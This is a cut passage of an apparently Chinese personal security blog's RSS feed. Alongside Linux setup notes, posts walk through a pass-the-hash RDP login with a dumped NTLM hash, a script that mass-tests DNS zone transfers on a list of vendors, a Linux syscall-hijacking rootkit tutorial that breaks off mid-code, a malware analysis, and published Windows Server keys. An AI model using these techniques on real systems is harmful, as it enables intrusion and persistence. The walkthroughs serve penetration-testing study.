&lt;p&gt;再就是这次直接安装了grub2,然后没有update-grub2命令,按照手册上生成配置文件之后,就有gentoo的菜单,其他的系统尝试直接用命令指定内核引导失败.可能ubuntu的引导弄的比较复杂参数.直接复制之前ubuntu的grub.cfg替换,引导成功.&lt;/p&gt;

&lt;p&gt;总的来说还比较顺利.&lt;/p&gt;

&lt;p&gt;还遇到一个问题就是chroot的提示/bin/bash 格式不对.原来是因为我在32位的系统,安装的是64位的原因.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/11/01/gentoo</link>
                <guid>http://username.github.io/技术研究/2013/11/01/gentoo</guid>
                <pubDate>2013-11-01T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>笔记本添加SSD遇到的问题</title>
                <description>&lt;p&gt;小伙伴们说ssd最好装载原硬盘位,把机械硬盘装在光驱位.这就导致一个问题,硬盘从sda变成了sdb,不过貌似ubuntu比较强,其实这样也可以启动,只是花的时间长了点,应该有自动搜寻的机制,只是苦了我的gentoo,提示找不到根分区.然后输入/dev/sdb4 指定根目录还是可以启动的.&lt;/p&gt;

&lt;p&gt;然后我采取了一种解决方案就是进入ubuntu系统,执行了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo update-grub2命令&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;本想这下应该了吧.结果gentoo依然提示sdb4找不到.由于时间紧,就想我先把硬盘换回来吧.结果诡异的事情发生了,硬盘换好之后.gentoo依然提示sdb4,找不到,在ubuntu里更新了 update-grub2之后也是这样提示.&lt;/p&gt;

&lt;p&gt;之后就是一番思考.首先可以确定的是,我把硬盘换回来,我又没有做其他的改动,应该不会出现任何问题.可是我的系统启动不了.经过一番尝试,我发现,应该是gentoo识别不了硬盘.&lt;/p&gt;

&lt;p&gt;这时想法是难道硬盘拆了下,gentoo识别不了了?是不是需要重新便一下内核.这样的话又得花好多时间.想到内核突然想到,这个过程中,我只做了一个操作.那就是update-grub2.而grub2自动生成menu的时候应该是自动搜寻内核的.我在gentoo上编译过好几次内核,会不会是menu里指定的内核有问题,导致识别不了硬盘.于是开机启动,编辑菜单,制定内核.成功启动.&lt;/p&gt;

&lt;p&gt;总结:&lt;/p&gt;

&lt;p&gt;遇到问题,先思考.找到问题的根源才能更好更快的解决.不要盲目.思考是非常必要的.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/31/ssd</link>
                <guid>http://username.github.io/技术研究/2013/10/31/ssd</guid>
                <pubDate>2013-10-31T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>linux磁盘管理</title>
                <description>&lt;p&gt;第一步发现新添加的磁盘使用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fdisk -l &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;列出所有的磁盘。比较笨的办法也可以到/dev 目录下 ls,查看新加入的磁盘名。如果仅仅是挂载，找到磁盘名就可以挂载了。&lt;/p&gt;

&lt;p&gt;第二步分区&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fdisk /dev/sdb &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参照命令提示就可以，比较简单。&lt;/p&gt;

&lt;p&gt;初始化swap分区&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkswap /dev/sda2&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;激活swap分区&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;swapon /dev/sda2&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;格式化分区 例题：&lt;/p&gt;

&lt;p&gt;将刚刚的 /dev/hdc6 格式化为 Windows 可读的 vfat 格式吧！&lt;/p&gt;

&lt;p&gt;答：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkfs -t vfat /dev/hdc6&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='id2644'&gt;参考鸟哥私房菜&lt;/h1&gt;

&lt;p&gt;http://vbird.dic.ksu.edu.tw/linux_basic/0230filesystem_3.php&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/10/31/linux</link>
                <guid>http://username.github.io/工具使用/2013/10/31/linux</guid>
                <pubDate>2013-10-31T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>gentoo amd64安装</title>
                <description></description>
                <link>http://username.github.io/2013/10/31/gentoo-amd64</link>
                <guid>http://username.github.io/2013/10/31/gentoo-amd64</guid>
                <pubDate>2013-10-31T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>adobe信息泄漏</title>
                <description>&lt;p&gt;根据Adobe发言人Heather Edell的表述,这次事件一共有3800万活跃用户受影响:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;根据我们的调查可以确认,攻击者一共获取了大约3800万活跃用户的用户识别码和加密密码.我们已经完成对这些受影响用户的邮件提醒.同时我们重置了这次事故中所有这些用户的密码,无论这个用户是否是活跃用户.(So far, our investigation has confirmed that the attackers obtained access to Adobe IDs and (what were at the time valid), encrypted passwords for approximately 38 million active users.We have completed email notification of these users. We also have reset the passwords for all Adobe IDs with valid, encrypted passwords that we believe were involved in the incident—regardless of whether those users are active or not.)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;她同时提到,对活跃用户的通知已经完成,对非活跃用户的处理工作正在进行中:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;我们依然在调查这次事故中涉及到的非活跃的,无效的和测试账号的数量.对非活跃用户的通知工作已经在进行中了.(We are still in the process of investigating the number of inactive, invalid and test accounts involved in the incident... Our notification to inactive users is ongoing.)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之前报道Adobe泄漏的源码包括Rader,Acrobat and ColdFusion.这次Edell承认部分Photoshop的源码也可能泄漏了:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;我们的调查表明部分,这次事故中,黑客也获取了部分Photoshop的源码.(Our investigation to date indicates that a portion of Photoshop source code was accessed by the attackers as part of the incident Adobe publicly disclosed on Oct. 3.)&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/10/31/adobe</link>
                <guid>http://username.github.io/2013/10/31/adobe</guid>
                <pubDate>2013-10-31T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>virtualbox安装windows2012</title>
                <description>&lt;p&gt;virtualbox安装windows 8.1或者windows server 2012 r2，出现0x000000C4错误，解决方案如下： （1）命令行下， 运行下面代码，找到VM名称，通常是大括号及其内部内容：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;quot;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&amp;quot;  list vms&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;（2）然后在命令行下运行下面的代码，记得先将&lt;span&gt;vmname&lt;/span&gt;替换为VM名称：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;quot;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&amp;quot; setextradata [vmname] VBoxInternal/CPUM/CMPXCHG16B 1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;序列号:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;数据中心版序列号：
JGXYY-7NMTC-MHKY3-QCC9B-VQRG7
自动虚拟机激活（AVMA）序列号：
XVNRV-9HTX4-TH2JD-HVJQD-QRQWG&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/10/30/virtualboxwindows2012</link>
                <guid>http://username.github.io/工具使用/2013/10/30/virtualboxwindows2012</guid>
                <pubDate>2013-10-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>使用hash登录windows2012的远程桌面</title>
                <description>&lt;p&gt;windows2012R2采用了新版的远程桌面协议(RDP).本文主要讨论一下新版协议中的&amp;#8221;受限管理员&amp;#8221;(&lt;a href='http://blogs.technet.com/b/kfalde/archive/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2.aspx'&gt;Restricted Admin&lt;/a&gt;)这个特性.相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣,通过这个特性,我们可以实现&lt;a href='http://en.wikipedia.org/wiki/Pass_the_hash'&gt;哈希传递攻击&lt;/a&gt;(Pass-the_Hash attacks).下面会先简要介绍一下哈希传递攻击,然后在windows2012R2上演示如何实现这样一种攻击.测试工具是我们在&lt;a href='http://www.freerdp.com/'&gt;FreeRDP&lt;/a&gt;的基础上修改的,可以在这里&lt;a href='http://labs.portcullis.co.uk/tools/freerdp-pth/'&gt;下载&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id='id2638'&gt;哈希传递攻击简介&lt;/h2&gt;

&lt;p&gt;简单点说,哈希传递就是用户登录的时候使用密码的哈希值代替密码来完成认证.很多windows的协议都是需要用户提供他们的密码哈希值,并不一定非得需要用户提供密码.这一点在渗透测试过程中非常重要,因为发现用户的密码哈希比发现用户的密码容易多了.&lt;/p&gt;

&lt;p&gt;对于8.1版的RDP大部分情况下都需要用户提供他们的密码.但是有一个例外,那就是受限管理员模式,这种情况下用户可以使用他们的密码哈系来登录.&lt;/p&gt;

&lt;p&gt;微软发布过&lt;a href='http://www.microsoft.com/en-gb/download/details.aspx?id=36036'&gt;防御哈希传递攻击的指南&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id='id2639'&gt;受限管理员模式&lt;/h2&gt;

&lt;p&gt;在windows2012R2运行&amp;#8221;mstsc /?&amp;#8221;命令,会给出如下对受限管理员模式的说明:&lt;/p&gt;

&lt;p&gt;&lt;img alt='restricted admin' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/hash5.png' /&gt;&lt;/p&gt;

&lt;p&gt;所以,开启了受限管理员模式之后,一些恢复已登录用户明文密码的工具比如&lt;a href='http://blog.gentilkiwi.com/mimikatz'&gt;minikatz&lt;/a&gt;就会失效了.基于这个理由,系统管理员肯定会被建议在2012的系统上开启这个特性.它的缺点是这个RDP会话中向外的连接可能无法通过认证,比如映射共享文件夹.所以连接一个独立的服务器的时候,这个特性很有用,连接一个跳板服务器的时候开启这个特性就没必要了.&lt;/p&gt;

&lt;h2 id='rdpv81'&gt;RDP协议v8.1&lt;/h2&gt;

&lt;p&gt;2013年7月22日,微软发布了RDP协议v8.1的&lt;a href='http://msdn.microsoft.com/en-us/library/cc240445.aspx'&gt;特性说明&lt;/a&gt;.可以通过点击&amp;#8221;关于&amp;#8221;来查看你的客户端是否支持v8.1&lt;/p&gt;

&lt;p&gt;&lt;img alt='restricted admin' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/hash2.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;我会简单介绍一下新版协议中的有意思的地方,这样你就不用花时间去读微软464页的技术文档了.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;37页的下方我们可以看到RDP客户端可以发送一个RESTRICTED_ADMIN_MODE_REQUIRED 标志.我们的测试工具就是发送了这个标志.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;同样在这一页上的说明是这样的:&amp;#8221;If the server supports this mode then it is acceptable for the client to send empty credentials in the TSPasswordCreds structure defined in &lt;span&gt;MS-CSSP&lt;/span&gt; section 2.2.1.2.1.&amp;#8221;(如果服务器支持这个模式,那么它会接受客户端用TSPasswordCreds这个结构发送空的认证信息).所以我们的测试工具需要发送一个空域名,空用户名,空密码的TSPassword结构到服务器端.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id='id2640'&gt;概念证明:场景&lt;/h2&gt;

&lt;p&gt;想象我们正在一个内网环境中进行渗透测试.我们的目标是登录一台Windows2012R2的远程桌面.这台服务器是一个独立的系统,而且开了防火墙,只允许RDP协议登录.&lt;/p&gt;

&lt;p&gt;这个网络里还有一些其他的主机,其中一台已经被我们攻破.使用&lt;a href='http://foofus.net/goons/fizzgig/fgdump/'&gt;fgdump&lt;/a&gt;(或者其他获取hash的工具)获取了管理员的密码hash如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test:1001:NO PASSWORD*********************:36374BD2767773A2DD4F6B010EC5EE0D:::&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们假设这个密码是一个非常变态的强密码,无法破解它.这在以前是没有办法确实这个test账户是否能登录我们的目标服务器的.不过在windows2012R2上,我们可以使用哈希传递攻击,使用这个密码hash来登录服务器.&lt;/p&gt;

&lt;h2 id='id2641'&gt;概念证明:实现&lt;/h2&gt;

&lt;p&gt;测试工具是我们在最新版的&lt;a href='https://github.com/FreeRDP/FreeRDP'&gt;FreeRDP&lt;/a&gt;的基础上修改的.最新版的FreeRDP支持了很多新的特性,比如:SSL和CredSSP(NLA),只需要稍微做一些修改就可以支持&amp;#8221;受限管理员&amp;#8221;模式了.&lt;/p&gt;

&lt;p&gt;建立RDP连接,通常的命令如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ xfreerdp -u test -p Portcullis1 192.168.226.129&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在修改版的FreeRDP中,-p选项被改成了密码hash,使用如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下图是使用hash登录的截图,图片下方是登录使用的命令.&lt;/p&gt;

&lt;p&gt;&lt;img alt='restricted admin' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/hash3.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;是的,就是这么简单.不过这个可能要等2012R2普及之后才能显示出它巨大的威力.&lt;/p&gt;

&lt;h2 id='id2642'&gt;限制条件&lt;/h2&gt;

&lt;p&gt;受限管理员模式顾名思义,只对管理员组有效.所以如果你获取到的用户属于远程桌面用户组,那么是无法通过hash登录的.会提示如下的错误:&lt;/p&gt;

&lt;p&gt;&lt;img alt='restricted admin' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/hash4.jpg' /&gt;&lt;/p&gt;

&lt;h3 id='id2643'&gt;测试心得&lt;/h3&gt;

&lt;p&gt;原版的工具使用使用说明如下:&lt;/p&gt;

&lt;p&gt;解压工具包:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar zxvf FreeRDP-pth.tar.gz (原参数写成了cfz,应该是笔误)
cd FreeRDP&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不编译执行:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ client/X11/xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重新编译命令:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ sh cmake.sh
$ make&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果遇到编译问题,可以参考FreeRDP的&lt;a href='https://github.com/FreeRDP/FreeRDP/wiki/Compilation'&gt;文档&lt;/a&gt;.在Ubuntu12.04上测试通过.&lt;/p&gt;

&lt;p&gt;经过一番艰苦的斗争,在不同的机器上反复测试,不断失败,最后完美的方法就是下载最新版FreeRDP,然后自己打补丁编译.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone git://github.com/FreeRDP/FreeRDP.git
cd FreeRDP
wget http://labs.portcullis.co.uk/wp-content/uploads/2013/10/FreeRDP-pth.diff_.txt
patch -p1 &amp;lt; FreeRDP-pth.diff_.txt
cmake -DCMAKE_BUILD_TYPE=Debug -DWITH_SSE2=ON .
make&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/29/hastwindows2012</link>
                <guid>http://username.github.io/技术研究/2013/10/29/hastwindows2012</guid>
                <pubDate>2013-10-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>使用hash登录windows</title>
                <description>&lt;h2 id='id2636'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://zone.wooyun.org/content/2230&lt;/p&gt;

&lt;p&gt;http://drops.wooyun.org/tips/24&lt;/p&gt;

&lt;h2 id='id2637'&gt;测试过程&lt;/h2&gt;

&lt;p&gt;在2003 原版未升级,测试成功.win7测试失败.看过程应该是权限不足.&lt;/p&gt;

&lt;p&gt;文章的评论说打过补丁的2003也是不能测试成功的.&lt;/p&gt;

&lt;p&gt;&lt;img alt='纪念' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/hash1.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/29/hashwindows</link>
                <guid>http://username.github.io/技术研究/2013/10/29/hashwindows</guid>
                <pubDate>2013-10-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>windows快捷键</title>
                <description>&lt;p&gt;组策略:gpedit.msc&lt;/p&gt;</description>
                <link>http://username.github.io/2013/10/28/windows</link>
                <guid>http://username.github.io/2013/10/28/windows</guid>
                <pubDate>2013-10-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>劫持系统调用表</title>
                <description>&lt;p&gt;http://syprog.blogspot.com/2011/10/hijack-linux-system-calls-part-iii.html&lt;/p&gt;

&lt;p&gt;未翻译.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/28/</link>
                <guid>http://username.github.io/技术研究/2013/10/</guid>
                <pubDate>2013-10-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>csrf 分析及防御</title>
                <description></description>
                <link>http://username.github.io/技术研究/2013/10/25/csrf-</link>
                <guid>http://username.github.io/技术研究/2013/10/25/csrf-</guid>
                <pubDate>2013-10-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>安全测试讲座感受</title>
                <description>&lt;p&gt;感觉确实开阔眼界,所以以后这种讲座要多参加.&lt;/p&gt;

&lt;p&gt;第一点就是安全测试跟渗透测试的区别,我们现在通常做的渗透测试一般都是怎么发现漏洞,怎么获取权限.控制了内网多少台机器.这个流程应该仅仅是安全测试的一部分.安全测试还要包括所有攻击面上做的测试,包括未成功的尝试,这样子的测试报告对厂商的价值更大,可以根据这样的报告来更好的部署安全防御体系.&lt;/p&gt;

&lt;p&gt;还有就是测试报告要尽可能的详细,留存测试过程中的所有数据,包括nmap使用的参数,返回值之类.&lt;/p&gt;

&lt;p&gt;讲师根据X.805 PETS,还有一些从来没听过说的测试规范流程,自己整理的测试报告范例.让人感觉确实积累深厚,不仅仅是安全技术,安全防御体系也有很深刻的见解.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/10/25/</link>
                <guid>http://username.github.io/2013/10/</guid>
                <pubDate>2013-10-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>win32/kankan 病毒分析</title>
                <description>&lt;h2 id='id2634'&gt;概述&lt;/h2&gt;

&lt;p&gt;最近ESET杀毒软件检测到一款名为Win32/KanKan的恶意软件.它有一下3个重要特征:&lt;/p&gt;

&lt;p&gt;1. 尽管自身没有办公软件的功能,但是在注册表里注册了一个办公插件,目的纯粹是为了更长久的在系统中存活.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;所有连接到受感染电脑的安卓手机都会被悄悄的安装多个APP.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;3. 这款恶意软件拥有迅雷网络技术有限公司的签名.&lt;/p&gt;

&lt;h2 id='id2635'&gt;详细分析&lt;/h2&gt;

&lt;p&gt;恶意软件的签名信息如下:&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei1.png' /&gt;&lt;/p&gt;

&lt;p&gt;这个恶意软件是一个windows安装程序,文件名为INPEnhSetup.exe.开始运行的时候会连接kkyouxi.stat.kankan.com 发送初始化消息.然后释放3个文件:INPEn.dll, INPEnhUD.exe和INPEnhSvc.exe.之后加载库文件INPEn.dll到内存,调用它的 DllRegisterServer函数.最后安装程序又向域名kkyouxi.stat.kankan.com发送安装完成消息.&lt;/p&gt;

&lt;p&gt;INPEn.dll运行时会安装一个Word,Excel,PowerPoint的名为InputEnhance的插件.通过创建一个注册表项使得办公软件每次启动就会加载这个插件,从而达到隐蔽运行的目的.&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei2.png' /&gt;&lt;/p&gt;

&lt;p&gt;dll文件运行之后会读取conf.kklm.n0808.com/tools.ini这个文件.(截至本文翻译时该文件依然可下载)&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei3.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;这个文件包含了多个参数.其中Tools和VID用base64编码过.&lt;/p&gt;

&lt;p&gt;Tools解码后如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;taskmgr.exe|tasklist.exe|procexp.exe|procmon.exe|devenv.exe|windbg.exe|filemon.exe|ollyice.exe|ollydbg.exe|processspy.exe|spyxx.exe|cv.exe|wireshark.exe&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;显然是检测这些工具是否运行,如果存在dll文件会停止运行,避免被发现.值得一提的这个列表里并只有分析工具,没有杀毒软件.看来作者的目的是为了防止软件被发现.&lt;/p&gt;

&lt;p&gt;dll文件运行之后还会通过访问baidu.com,qq.com等域名来检测网络是否通畅.如果没有联网就周期性的检测网络连接.&lt;/p&gt;

&lt;p&gt;一旦网络连接建立,它就会执行INPEnhUD.exe.我们称这个文件为更新程序.它首先访问这个URL: update.kklm.n0808.com/officeaddinupdate.xml.&lt;/p&gt;

&lt;p&gt;officeaddinupdate.xml当前的内容如下:&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei4.png' /&gt;&lt;/p&gt;

&lt;p&gt;这个xml文件包含一个url和md5 hash的列表.INPEnhUD.exe会下载没一个url里的文件,然后比对md5,如果通过就执行这个文件.&lt;/p&gt;

&lt;p&gt;当前xml里只有一个Uninstall.exe,现在该软件下载这个程序会把自己卸载掉.当下载完列表里的程序后,最后会执行第三个文件,INPEnhSvc.exe.&lt;/p&gt;

&lt;p&gt;INPEnhSvc.exe是这3个文件架构的最核心.它获取一个包含7个命令的XML配置文件.7个命令可以分为下面两组:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;local commands: scanreg, scandesktop, scanfavorites

outsourced commands: installpcapp, installphoneapp, setdesktopshortcut, addfavorites, setiestartpage&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;整个程序的架构可以用下图表示:&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei5.png' /&gt;&lt;/p&gt;

&lt;p&gt;下面分析一下我们最感兴趣的&amp;#8221;installphoneapp&amp;#8221;命令.其实大多数命令都可以从它的名字看出他大概的作用.&amp;#8221;installphoneapp&amp;#8221;会下载一些安卓应用,然后安装到连接到该电脑的手机上.&lt;/p&gt;

&lt;p&gt;当我们开始调查的时候,这些安卓应用已经不能下载了.我们在中国的一些安全论坛里找到几个样本.下面是这些应用的截图.&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei6.png' /&gt;&lt;/p&gt;

&lt;p&gt;下图是ESET每天检测到的这个名为 Win32/kankan软件的安装数据.&lt;/p&gt;

&lt;p&gt;&lt;img alt='签名' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/xunlei7.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/22/win32kankan-</link>
                <guid>http://username.github.io/技术研究/2013/10/22/win32kankan-</guid>
                <pubDate>2013-10-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>simple rootkit</title>
                <description></description>
                <link>http://username.github.io/技术研究/2013/10/18/simple-rootkit</link>
                <guid>http://username.github.io/技术研究/2013/10/18/simple-rootkit</guid>
                <pubDate>2013-10-18T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>sed cheat sheet</title>
                <description></description>
                <link>http://username.github.io/代码人生/2013/10/17/sed-cheat-sheet</link>
                <guid>http://username.github.io/代码人生/2013/10/17/sed-cheat-sheet</guid>
                <pubDate>2013-10-17T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>批量检测域传送漏洞</title>
                <description>&lt;p&gt;参考资料:&lt;/p&gt;

&lt;p&gt;http://www.wooyun.org/bugs/wooyun-2010-037727&lt;/p&gt;

&lt;p&gt;获取wooyun厂商域名:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

for ((i=1;i&amp;lt;25;i++))

do

    curl http://www.wooyun.org/corps/page/$i|grep nofollow &amp;gt;&amp;gt; wooyun.txt

done&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;筛选出域名列表&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sed -e &amp;#39;s#.*//\(.*\)&amp;lt;/a.*#\1#&amp;#39; -e &amp;#39;s#www\.\|/##&amp;#39; wooyun.txt | sed &amp;#39;s/\///g&amp;#39; &amp;gt; domain.txt&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sed -e 参数&lt;/p&gt;

&lt;p&gt;测试域传送漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

while read oneline

do

NS=`dig ${oneline} +nssearch|head -1|awk &amp;#39;{printf $2}&amp;#39;` #取DNS服务器

dig @${NS} ${oneline} axfr  &amp;gt;&amp;gt; dns.txt

done &amp;lt; wooyun.org.txt  #厂商列表&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/17/</link>
                <guid>http://username.github.io/技术研究/2013/10/</guid>
                <pubDate>2013-10-17T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>syscall hijacking:kernel 2.6 systems</title>
                <description>&lt;p&gt;这篇文章会详细的介绍如何劫持系统调用.文章中讨论的重点是如何绕过内核的保护和cpu的&amp;#8221;保护模式&amp;#8221;.&lt;/p&gt;

&lt;h2 id='id2630'&gt;访问系统调用表&lt;/h2&gt;

&lt;p&gt;内核版本2.4以前的rootkit在2.6及以上的内核里是无法运行的.这是因为2.6以后,&amp;#8221;sys_call_table&amp;#8221;无法导出了,也就没有办法直接访问到.而且&amp;#8221;sys_call_table&amp;#8221;所在的内存页具有写保护,下面这种方式也是没法访问的:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;extern void *sys_call_table[];
...
sys_call_table[__NR_syscall] = pointer&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不过这个表终归是在内存里,只要我们知道了它的内存地址,就可以通过一个简单的指针直接访问.有很多种办法可以获取到这个地址,最简单的就是查找&amp;#8221;/boot&amp;#8221;目录下的&amp;#8221;System.map&amp;#8221;文件了.这个文件是内核编译的时候创建的,它包含了内核使用的所有代号和想对应的地址.&lt;/p&gt;

&lt;p&gt;这个文件的内容大致如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ cat /boot/System.map-2.6.35-23-generic
...
c018d140 t cgroup_remount
c018d260 T cgroup_path
c018d310 t allocate_cg_links
c018d410 t find_css_set
c018d7d0 T cgroup_attach_task
c018da40 T cgroup_clone
c018dcc0 t cgroup_tasks_write
c018dd90 t cgroup_release_agent
c018df50 t proc_cgroup_show
c018e180 t cgroup_pidlist_find
c018e320 t cgroup_write_event_control
c018e610 t pidlist_allocate
c018e640 t pidlist_array_load
...&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;内容很多,不过我们只对&amp;#8221;sys_call_table&amp;#8221;的内容感兴趣:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ cat /boot/System.map-2.6.35-23-generic | grep sys_call_table
c05d2180 R sys_call_table&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2631'&gt;绕过内核的写保护&lt;/h2&gt;

&lt;p&gt;现在我们得到了系统调用表的地址,不过如果大家细心的话会发现&amp;#8221;grep&amp;#8221;命令的输出中有一个&amp;#8221;R&amp;#8221;的标志,它代表了这个地址是&amp;#8221;只读的&amp;#8221;.&lt;/p&gt;

&lt;p&gt;事实上内核在这个只读的区域内存储了一些结构,这样子就可以防止这些结构被修改而导致系统的不稳定.所以我们想要修改这些结构的话首先要把它设置成&amp;#8221;读写&amp;#8221;模式.&lt;/p&gt;

&lt;p&gt;幸运的是内核已经给我们提供了一个特殊的函数来完成这个任务:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc012fbb0;
void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc012fe80;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;#8220;pages_rw&amp;#8221;函数设置页面为写模式, &amp;#8220;page_ro&amp;#8221;设置页面为读模式.但是这两个函数的参数为页面的虚拟地址.我们可以使用&amp;#8221;virt_to_page()&amp;#8221;这个函数.这个函数可以把内核访问的页面物理地址转换为页面的虚拟地址.为了使用这两个函数,我们首先也需要知道他们的地址.可以从&amp;#8221;System.map&amp;#8221;文件读取:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ cat /boot/System.map-2.6.35-23-generic | grep -e pages_rw -e pages_ro
c012fbb0 T set_pages_rw
c012fe80 T set_pages_ro&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在我们就可以通过这种方式来修改&amp;#8221;sys_call_table&amp;#8221;了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;...
 
unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
 
...
 
void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc012fbb0;
void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc012fe80;
 
...
 
static int init(void)
{
 
    struct page *_sys_call_page;
    printk(KERN_ALERT &amp;quot;\nHIJACK INIT\n&amp;quot;);
 
